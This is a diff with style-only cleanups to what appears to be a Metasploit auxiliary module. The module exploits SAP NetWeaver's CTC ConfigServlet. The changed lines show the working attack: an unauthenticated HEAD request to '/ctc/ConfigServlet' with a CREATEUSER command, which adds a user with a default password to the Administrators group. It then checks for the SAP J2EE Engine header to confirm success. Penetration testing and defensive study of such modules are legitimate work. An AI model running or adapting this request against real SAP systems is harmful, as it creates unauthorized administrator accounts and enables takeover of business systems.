@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -50,14 +51,14 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     register_options([
-      Opt::RPORT(50000),
-      OptString.new('USERNAME', [true, 'Username to create', 'msf']),
-      OptString.new('PASSWORD', [true, 'Password for the new user', '$Metasploit1234$']),
-      OptString.new('GROUP', [true, 'Group for the new user', 'Administrators'])
-    ], self.class)
+                       Opt::RPORT(50000),
+                       OptString.new('USERNAME', [true, 'Username to create', 'msf']),
+                       OptString.new('PASSWORD', [true, 'Password for the new user', '$Metasploit1234$']),
+                       OptString.new('GROUP', [true, 'Group for the new user', 'Administrators'])
+                     ], self.class)
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     vprint_status("#{rhost}:#{rport} - Creating User...")
     uri = '/ctc/ConfigServlet?param=com.sap.ctc.util.UserConfig;CREATEUSER;USERNAME=' + datastore['USERNAME'] + ',PASSWORD=' + datastore['PASSWORD']
     if send_request(uri)
@@ -113,13 +114,11 @@ class MetasploitModule < Msf::Auxiliary
 
   def send_request(uri)
     begin
-      res = send_request_cgi({
-        'uri' => uri,
-        'method' => 'HEAD',
-        'ctype' => 'text/xml; charset=UTF-8',
-        'cookie' => 'sap-usercontext=sap-language=EN'
-      })
-      if res and res.code == 200 and res.headers['Server'] =~ /SAP J2EE Engine/
+      res = send_request_cgi('uri' => uri,
+                             'method' => 'HEAD',
+                             'ctype' => 'text/xml; charset=UTF-8',
+                             'cookie' => 'sap-usercontext=sap-language=EN')
+      if res && (res.code == 200) && res.headers['Server'] =~ /SAP J2EE Engine/
         return true
       elsif res
         vprint_error("#{rhost}:#{rport} - Unexpected Response: #{res.code} #{res.message}")
